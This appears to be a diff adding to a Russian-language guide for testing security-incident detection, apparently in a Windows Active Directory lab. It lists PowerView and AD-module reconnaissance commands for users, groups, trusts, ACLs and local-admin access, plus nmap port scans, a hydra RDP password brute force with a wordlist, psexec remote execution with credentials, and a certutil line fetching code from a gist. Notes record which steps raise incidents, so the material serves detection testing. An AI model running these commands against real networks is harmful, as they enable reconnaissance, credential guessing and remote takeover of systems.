@@ -50,7 +50,55 @@ certutil.exe -urlcache -f https://gist.githubusercontent.com/enigma0x3/469d82d1b
 ```
 
 P.S.
-Для тестирования учётки AD на АРМ должен быть установлен RSAT или импортировать dll с частью 
+Для тестирования учётки AD на АРМ должен быть установлен RSAT или импортировать Microsoft.ActiveDirectory.Management.dll в powershell (будет доступа часть командлетов связанных с AD), большая часть отработает с ошибками, что породит инциденты о разведке привилегий. Запуск с контроллера домена выдаст больше выхлопа.
+
+```bat
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+
+Get-ADGroup -Filter *
+Get-ADGroup -Filter {Name -like "admin"} | select name, GroupScope
+Get-ADDomain
+Get-ADForest
+Get-ADTrust -Filter *
+
+
+Get-DomainPolicy
+Get-NetDomain
+Get-DomainSID
+Get-NetDomainController
+Get-NetUser
+Get-NetComputer
+Get-NetComputer -Ping
+Get-NetGroup
+Get-NetGroup *admin*
+Get-NetGroupMember -GroupName "Domain Admins"
+Invoke-ShareFinder
+Get-NetGPO -ComputerName client-02.fanzy.com
+Find-GPOLocation -UserName Aziz
+Get-NetOU
+Get-NetDomainTrust
+Get-NetForest
+Get-NetForest -Forest dampy.com
+Get-NetForestDomain
+Get-NetForestCatalog
+Get-NetForestTrust
+Find-LocalAdminAccess
+Invoke-EnumerateLocalAdmin
+Invoke-UserHunter
+Invoke-UserHunter -CheckAccess
+Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
+Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"
+```
 
 P.S.S
-С атакующего компа 
+С атакующего компа можно побрутить, посканить порты, позапускать psexec.
+
+```bash
+nmap -A -p- -T4 192.168.23.56(Блокируется фаерволом, но нет инцидента в винде)
+nmap -Pn -p- -T4 192.168.23.56 (Нет инцидента о сборе инфы)
+
+hydra rdp://192.168.23.56 -l admin -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt
+
+psexec \\192.168.99.56 -s -u администратор -p 12345 cmd.exe и whoami
+```
